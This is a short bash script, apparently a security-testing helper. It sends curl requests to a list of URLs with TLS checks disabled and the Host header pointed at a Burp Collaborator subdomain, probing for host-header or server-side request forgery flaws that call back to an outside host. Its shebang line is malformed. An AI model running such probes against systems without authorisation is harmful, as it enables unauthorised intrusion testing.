#/bin/bash

for i in $(tac $1)
do
ID=$(basename $i)
curl -k $i -H "Host: $ID.f5lgrqpegiqkq2acj49kxr48gzmqaf.burpcollaborator.net"
done
